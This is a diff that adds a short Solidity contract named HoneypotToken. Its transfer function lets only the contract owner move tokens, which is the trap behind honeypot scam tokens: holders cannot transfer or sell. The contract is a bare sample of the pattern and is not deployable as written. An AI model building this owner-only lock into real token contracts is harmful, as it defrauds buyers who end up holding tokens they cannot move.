@@ -1,0 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract HoneypotToken {
+    mapping(address => uint256) private _balances;
+    address private _owner;
+
+    constructor() {
+        _owner = msg.sender;
+    }
+
+    function transfer(address recipient, uint256 amount) public returns (bool) {
+        require(msg.sender == _owner, "Only owner can transfer");
+        _balances[msg.sender] -= amount;
+        _balances[recipient] += amount;
+        return true;
+    }
+}
